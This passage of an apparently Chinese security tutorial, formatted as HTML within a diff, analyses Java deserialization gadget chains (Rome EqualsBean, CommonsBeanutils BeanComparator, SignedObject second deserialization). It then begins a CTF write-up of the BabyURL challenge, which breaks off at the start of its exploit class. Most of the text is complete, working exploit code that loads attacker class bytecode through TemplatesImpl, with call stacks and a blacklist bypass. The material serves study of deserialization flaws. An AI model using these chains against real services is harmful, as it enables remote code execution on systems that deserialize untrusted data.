+        <span class="n">ObjectOutputStream</span> <span class="n">oos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">baos</span><span class="o">);</span>
+        <span class="n">oos</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">table2</span><span class="o">);</span>
+        <span class="n">oos</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+        <span class="c1">//System.out.println(new String(Base64.getEncoder().encode(baos.toByteArray())));</span>
+
+        <span class="c1">//反序列化</span>
+        <span class="n">ByteArrayInputStream</span> <span class="n">bais</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayInputStream</span><span class="o">(</span><span class="n">baos</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">());</span>
+        <span class="n">ObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="n">bais</span><span class="o">);</span>
+        <span class="n">ois</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+        <span class="n">ois</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Hashtable</span> <span class="nf">getPayload</span> <span class="o">(</span><span class="n">Class</span> <span class="n">clazz</span><span class="o">,</span> <span class="n">Object</span> <span class="n">payloadObj</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
+        <span class="n">EqualsBean</span> <span class="n">bean</span> <span class="o">=</span> <span class="k">new</span> <span class="n">EqualsBean</span><span class="o">(</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="s">"r"</span><span class="o">);</span>
+        <span class="n">HashMap</span> <span class="n">map1</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
+        <span class="n">HashMap</span> <span class="n">map2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
+        <span class="n">map1</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"yy"</span><span class="o">,</span> <span class="n">bean</span><span class="o">);</span>
+        <span class="n">map1</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"zZ"</span><span class="o">,</span> <span class="n">payloadObj</span><span class="o">);</span>
+        <span class="n">map2</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"zZ"</span><span class="o">,</span> <span class="n">bean</span><span class="o">);</span>
+        <span class="n">map2</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"yy"</span><span class="o">,</span> <span class="n">payloadObj</span><span class="o">);</span>
+        <span class="n">Hashtable</span> <span class="n">table</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Hashtable</span><span class="o">();</span>
+        <span class="n">table</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">map1</span><span class="o">,</span> <span class="s">"1"</span><span class="o">);</span>
+        <span class="n">table</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">map2</span><span class="o">,</span> <span class="s">"2"</span><span class="o">);</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">bean</span><span class="o">,</span> <span class="s">"_beanClass"</span><span class="o">,</span> <span class="n">clazz</span><span class="o">);</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">bean</span><span class="o">,</span> <span class="s">"_obj"</span><span class="o">,</span> <span class="n">payloadObj</span><span class="o">);</span>
+        <span class="k">return</span> <span class="n">table</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<p>调用栈</p>
+<div class="highlight"><pre><span></span>getObject:177, SignedObject (java.security)
+invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+invoke:62, NativeMethodAccessorImpl (sun.reflect)
+invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+invoke:498, Method (java.lang.reflect)
+beanEquals:146, EqualsBean (com.sun.syndication.feed.impl)
+equals:103, EqualsBean (com.sun.syndication.feed.impl)
+equals:495, AbstractMap (java.util)
+reconstitutionPut:1241, Hashtable (java.util)
+readObject:1215, Hashtable (java.util)
+</pre></div>
+<h4 data-content="1" id="3876dcdf027f7e9d74e0ad53ef8b9530">CommonsBeanutils</h4>
+<p>这里也快速分析下CB链调用getter的流程吧</p>
+<p>以下形式来直接动态获取值</p>
+<div class="highlight"><pre><span></span><span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">PropertyUtils</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="n">student</span><span class="o">,</span> <span class="s">"name"</span><span class="o">));</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240227202900-c8b6b4e0-d56b-1.png"/></p>
+<p>这里断点进去看看是如何实现传入<code>name</code>​就调用<code>getName</code>​方法的</p>
+<p>进去后发现会去调用<code>getNestedProperty</code>​</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240227202908-cd896602-d56b-1.png"/></p>
+<p>跟进后发现他是去判断我们传入的类是什么类型的，如果都不属于下图中类就调用<code>getSimpleProperty</code>​方法</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240227202915-d1c18902-d56b-1.png"/></p>
+<p>然后也是进去一系列判断如果都不属于这些类就调用<code>getPropertyDescriptor</code>​方法</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240227202921-d53e3b66-d56b-1.png"/></p>
+<p>而这个就是重点方法了，这里其实不需要去看他怎么实现的，他会返回<code>PropertyDescriptor类</code>​我们直接看他返回的对象<code>descriptor</code>​即可</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240227202926-d8871914-d56b-1.png"/></p>
+<p>可以发现他返回了几个属性，恰好就是setter getter方法名字</p>
+<p>再接着往下就是获取方法的名字，然后去调用641行的反射</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240227202932-dc1334d2-d56b-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240227202937-dec0a0a2-d56b-1.png"/></p>
+<p>所以到这里我们又可以想象<code>Fastjson</code>​一样，假设谁的 <code>PropertyUtils.getProperty</code>​ 传参是可控的，那么找到一个函数的 getter 是有危险行为的，那么通过CB链就可以去触发导致代码执行(而在Fastjson中也是有这种情况发生，所以后半段恶意类加载就可以利用<code>TemplatesImpl</code>​链来完成)</p>
+<p>我们可以来写一个demo</p>
+<div class="highlight"><pre><span></span><span class="n">TemplatesImpl</span> <span class="n">templates</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="o">();</span>
+        <span class="n">Class</span> <span class="n">tc</span> <span class="o">=</span>  <span class="n">templates</span><span class="o">.</span><span class="na">getClass</span><span class="o">();</span>
+        <span class="n">Field</span> <span class="n">bytecodesField</span> <span class="o">=</span> <span class="n">tc</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_bytecodes"</span><span class="o">);</span>
+        <span class="n">bytecodesField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="kt">byte</span><span class="o">[]</span> <span class="n">code</span> <span class="o">=</span> <span class="n">Files</span><span class="o">.</span><span class="na">readAllBytes</span><span class="o">(</span><span class="n">Paths</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"E:\\Java_project\\Serialization_Learing\\target\\classes\\Test.class"</span><span class="o">));</span>
+        <span class="kt">byte</span><span class="o">[][]</span> <span class="n">codes</span> <span class="o">=</span> <span class="o">{</span><span class="n">code</span><span class="o">};</span>
+        <span class="n">bytecodesField</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="n">codes</span><span class="o">);</span>
+        <span class="n">Field</span> <span class="n">nameField</span> <span class="o">=</span> <span class="n">tc</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_name"</span><span class="o">);</span>
+        <span class="n">nameField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">nameField</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">"test"</span><span class="o">);</span>
+        <span class="n">Field</span> <span class="n">facField</span> <span class="o">=</span> <span class="n">tc</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_tfactory"</span><span class="o">);</span>
+        <span class="n">facField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">facField</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="k">new</span> <span class="n">TransformerFactoryImpl</span><span class="o">());</span>
+        <span class="n">templates</span><span class="o">.</span><span class="na">newTransformer</span><span class="o">();</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">PropertyUtils</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">"outputProperties"</span><span class="o">));</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240227202944-e2f6b3f0-d56b-1.png"/></p>
+<p>那么现在已经后半条链已经衔接好了，现在就是去找jdk跟CB依赖中进行衔接的反序列化点</p>
+<p>也就是去找谁去调用了<code>getProperty</code>​方法</p>
+<p>‍</p>
+<p>于是找到了 <code>commons-beanutils-1.8.3.jar!\org\apache\commons\beanutils\BeanComparator#compare()</code>​方法</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240227202949-e62f2084-d56b-1.png"/></p>
+<p>这写法跟CC4的太像了真的，所以找到<code>compare()</code>​就可以联想到CC4的入口直接拼起来就可以串起来了</p>
+<p>其实在这里我一直有个疑问，就是这个<code>compare()</code>​到底是否可控，因为他传两个参数我并不知道是在哪里可以控制的，调试了下也明白了，如下图</p>
+<p>可以发现在721行是将<code>x</code>​传入，那么<code>x</code>​怎么进来的呢？</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240227202954-e93e6c26-d56b-1.png"/></p>
+<p>在上一个方法中就把<code>x</code>​传进来了</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240227202958-eb64e188-d56b-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240227203002-edb98b50-d56b-1.png"/></p>
+<p>在<code>heapify</code>​中就传了对象，再往上跟就是<code>readObject</code>​了，而在<code>heapify</code>​中进行了数组的右移所以可以寻找到该属性通过 <code>priorityQueue.add(templates);</code>​传入的类,如果我们传入 <code>3</code>​ 就会不一样了</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240227203006-f0506bd6-d56b-1.png"/></p>
+<p>就会变成数字类<code>3</code>​ 这也就是为什么我们队列这里要写入<code>TemplatesImpl</code>​类，这样子才能去调用到<code>TemplatesImpl</code>​类的getter方法</p>
+<p>调用链</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">PriorityQueue#ReadObject() -&gt; PriorityQueue#siftDownUsingComparator() -&gt; BeanComparator#compare() -&gt;PropertyUtilsBean#getSimpleProperty() -&gt; TemplatesImpl#getOutputProperties()</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">SignedObject</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.beanutils.BeanComparator</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.io.ByteArrayInputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ByteArrayOutputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ObjectInputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.nio.file.Files</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.nio.file.Paths</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.security.KeyPair</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.security.KeyPairGenerator</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.security.Signature</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.security.SignedObject</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.PriorityQueue</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">CB_SignedObject</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setFieldValue</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">,</span><span class="n">String</span> <span class="n">fieldname</span><span class="o">,</span><span class="n">Object</span> <span class="n">value</span><span class="o">)</span><span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
+        <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">fieldname</span><span class="o">);</span>
+        <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">field</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span><span class="n">value</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="kt">byte</span><span class="o">[]</span> <span class="n">payloads</span> <span class="o">=</span> <span class="n">Files</span><span class="o">.</span><span class="na">readAllBytes</span><span class="o">(</span><span class="n">Paths</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"D:\\Security-Testing\\Java-Sec\\Java-Sec-Payload\\target\\classes\\Evail_Class\\Calc_Ab.class"</span><span class="o">));</span>
+
+        <span class="n">TemplatesImpl</span> <span class="n">obj</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="o">();</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">"_bytecodes"</span><span class="o">,</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]{</span><span class="n">payloads</span><span class="o">});</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">"_name"</span><span class="o">,</span> <span class="s">"a"</span><span class="o">);</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">"_tfactory"</span><span class="o">,</span> <span class="k">new</span> <span class="n">TransformerFactoryImpl</span><span class="o">());</span>
+        <span class="n">PriorityQueue</span> <span class="n">queue1</span> <span class="o">=</span> <span class="n">getpayload</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">"outputProperties"</span><span class="o">);</span>
+
+        <span class="n">KeyPairGenerator</span> <span class="n">kpg</span> <span class="o">=</span> <span class="n">KeyPairGenerator</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"DSA"</span><span class="o">);</span>
+        <span class="n">kpg</span><span class="o">.</span><span class="na">initialize</span><span class="o">(</span><span class="mi">1024</span><span class="o">);</span>
+        <span class="n">KeyPair</span> <span class="n">kp</span> <span class="o">=</span> <span class="n">kpg</span><span class="o">.</span><span class="na">generateKeyPair</span><span class="o">();</span>
+        <span class="n">SignedObject</span> <span class="n">signedObject</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SignedObject</span><span class="o">(</span><span class="n">queue1</span><span class="o">,</span> <span class="n">kp</span><span class="o">.</span><span class="na">getPrivate</span><span class="o">(),</span> <span class="n">Signature</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"DSA"</span><span class="o">));</span>
+
+        <span class="n">PriorityQueue</span> <span class="n">queue2</span> <span class="o">=</span> <span class="n">getpayload</span><span class="o">(</span><span class="n">signedObject</span><span class="o">,</span> <span class="s">"object"</span><span class="o">);</span>
+
+        <span class="c1">//序列化</span>
+        <span class="n">ByteArrayOutputStream</span> <span class="n">baos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
+        <span class="n">ObjectOutputStream</span> <span class="n">oos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">baos</span><span class="o">);</span>
+        <span class="n">oos</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">queue2</span><span class="o">);</span>
+        <span class="n">oos</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+        <span class="c1">//System.out.println(new String(Base64.getEncoder().encode(baos.toByteArray())));</span>
+
+        <span class="c1">//反序列化</span>
+        <span class="n">ByteArrayInputStream</span> <span class="n">bais</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayInputStream</span><span class="o">(</span><span class="n">baos</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">());</span>
+        <span class="n">ObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="n">bais</span><span class="o">);</span>
+        <span class="n">ois</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+        <span class="n">ois</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="n">PriorityQueue</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="nf">getpayload</span><span class="o">(</span><span class="n">Object</span> <span class="n">object</span><span class="o">,</span> <span class="n">String</span> <span class="n">string</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="n">BeanComparator</span> <span class="n">beanComparator</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BeanComparator</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">CASE_INSENSITIVE_ORDER</span><span class="o">);</span>
+        <span class="n">PriorityQueue</span> <span class="n">priorityQueue</span> <span class="o">=</span> <span class="k">new</span> <span class="n">PriorityQueue</span><span class="o">(</span><span class="mi">2</span><span class="o">,</span> <span class="n">beanComparator</span><span class="o">);</span>
+        <span class="n">priorityQueue</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"1"</span><span class="o">);</span>
+        <span class="n">priorityQueue</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"2"</span><span class="o">);</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">beanComparator</span><span class="o">,</span> <span class="s">"property"</span><span class="o">,</span> <span class="n">string</span><span class="o">);</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">priorityQueue</span><span class="o">,</span> <span class="s">"queue"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="n">object</span><span class="o">,</span> <span class="kc">null</span><span class="o">});</span>
+        <span class="k">return</span> <span class="n">priorityQueue</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<p>调用栈</p>
+<div class="highlight"><pre><span></span><span class="nl">getObject:</span><span class="mi">179</span><span class="o">,</span> <span class="n">SignedObject</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">security</span><span class="o">)</span>
+<span class="nl">invoke0:</span><span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
+<span class="nl">invoke:</span><span class="mi">62</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
+<span class="nl">invoke:</span><span class="mi">43</span><span class="o">,</span> <span class="n">DelegatingMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
+<span class="nl">invoke:</span><span class="mi">498</span><span class="o">,</span> <span class="n">Method</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
+<span class="nl">invokeMethod:</span><span class="mi">2116</span><span class="o">,</span> <span class="n">PropertyUtilsBean</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">commons</span><span class="o">.</span><span class="na">beanutils</span><span class="o">)</span>
+<span class="nl">getSimpleProperty:</span><span class="mi">1267</span><span class="o">,</span> <span class="n">PropertyUtilsBean</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">commons</span><span class="o">.</span><span class="na">beanutils</span><span class="o">)</span>
+<span class="nl">getNestedProperty:</span><span class="mi">808</span><span class="o">,</span> <span class="n">PropertyUtilsBean</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">commons</span><span class="o">.</span><span class="na">beanutils</span><span class="o">)</span>
+<span class="nl">getProperty:</span><span class="mi">884</span><span class="o">,</span> <span class="n">PropertyUtilsBean</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">commons</span><span class="o">.</span><span class="na">beanutils</span><span class="o">)</span>
+<span class="nl">getProperty:</span><span class="mi">464</span><span class="o">,</span> <span class="n">PropertyUtils</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">commons</span><span class="o">.</span><span class="na">beanutils</span><span class="o">)</span>
+<span class="nl">compare:</span><span class="mi">163</span><span class="o">,</span> <span class="n">BeanComparator</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">commons</span><span class="o">.</span><span class="na">beanutils</span><span class="o">)</span>
+<span class="nl">siftDownUsingComparator:</span><span class="mi">722</span><span class="o">,</span> <span class="n">PriorityQueue</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
+<span class="nl">siftDown:</span><span class="mi">688</span><span class="o">,</span> <span class="n">PriorityQueue</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
+<span class="nl">heapify:</span><span class="mi">737</span><span class="o">,</span> <span class="n">PriorityQueue</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
+<span class="nl">readObject:</span><span class="mi">797</span><span class="o">,</span> <span class="n">PriorityQueue</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
+<span class="nl">invoke0:</span><span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
+<span class="nl">invoke:</span><span class="mi">62</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
+<span class="nl">invoke:</span><span class="mi">43</span><span class="o">,</span> <span class="n">DelegatingMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
+<span class="nl">invoke:</span><span class="mi">498</span><span class="o">,</span> <span class="n">Method</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
+<span class="nl">invokeReadObject:</span><span class="mi">1170</span><span class="o">,</span> <span class="n">ObjectStreamClass</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
+<span class="nl">readSerialData:</span><span class="mi">2178</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
+<span class="nl">readOrdinaryObject:</span><span class="mi">2069</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
+<span class="nl">readObject0:</span><span class="mi">1573</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
+<span class="nl">readObject:</span><span class="mi">431</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
+</pre></div>
+<h4 data-content="1" id="a2f75e97441cd8d392f339427314ac43">Jackson链</h4>
+<p>刚好Jackson的首发就是先知，如果对<code>POJONode#tostring()</code>不懂流程的话，可以参考我后续写的参考链接，写的蛮清楚的</p>
+<p>其实就是通过<code>POJONode#tostring()</code>​来进行getter的调用，那么怎么触发tostring方法呢在反序列化中，也就是两种形式</p>
+<ol>
+<li>​<code>Rome</code>​ 上述的<code>ToStringBean#tostring()</code>​</li>
+<li>​<code>BadAttributeValueExpException#readObject()</code>​</li>
+</ol>
+<h5 data-content="1" id="9110501070e1ed04375d7977da838530">例题分析 - 2023 巅峰极客 BabyURL</h5>
+<h6 data-content="1" id="0c094c1e5852a18ec2135d8a4bdfd06e">考点分析</h6>
+<ol>
+<li>Java代码审计</li>
+<li>Java SignedObject 二次反序列化</li>
+<li>Jackson 链反序列化漏洞</li>
+</ol>
+<p>给了jar包，先看目录结构</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240227195727-607ae184-d567-1.png"/></p>
+<p>有两个控制器</p>
+<p>第一个是<code>hack</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240227195739-67cec842-d567-1.png"/></p>
+<p>传base64的payload进来反序列化成<code>URLHelper</code>​类，但这里是他自己写的反序列化，跟进下<code>MyObjectInputStream</code>​发现写了黑名单</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240227195745-6b511b0a-d567-1.png"/></p>
+<p>​<code>java.net.InetAddress","org.apache.commons.collections.Transformer","org.apache.commons.collections.functors", "com.yancao.ctf.bean.URLVisiter", "com.yancao.ctf.bean.URLHelper</code>​</p>
+<p>第二个是<code>file</code></p>
+<p>/file路由会读取/tmp/file的内容并返回</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240227195806-78184ebc-d567-1.png"/></p>
+<p>再来看看黑名单的两个类</p>
+<p>​<code>URLHelper</code>​</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240227195818-7ed12c38-d567-1.png"/></p>
+<p>在ReadObject方法中可以对<code>/tmp/file/</code>​操作，并且会用<code>visitUrl</code>​处理传入的值</p>
+<p>​<code>URLVisiter</code>​</p>
+<p>传入的内容不能以<code>file</code>​开头，对传入的内容进行<code>new URL()</code>​处理</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240227195835-8948b6ea-d567-1.png"/></p>
+<p>那么限制我们来罗列一下</p>
+<ol>
+<li>可以打URL的一个读取文件，但是有一个黑名单拦截，但是大写即可绕过</li>
+<li>反序列化存在黑名单，但是可以打SignedObject的二次反序列化来触发<code>URLHelper</code>​类</li>
+<li>如何拼接SignedObject链呢？查看依赖发现存在Jackson链 ，想到<code>BadAttributeValueExpException</code>​ 配合 <code>POJONode</code>​ 链</li>
+</ol>
+<p>那么问题就解决了，编写下EXP</p>
+<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">com.yancao.ctf</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">com.yancao.ctf.bean.URLHelper</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.yancao.ctf.bean.URLVisiter</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.fasterxml.jackson.databind.node.POJONode</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.io.FileOutputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.security.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javassist.*</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">javax.management.BadAttributeValueExpException</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">exp</span>
+<span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
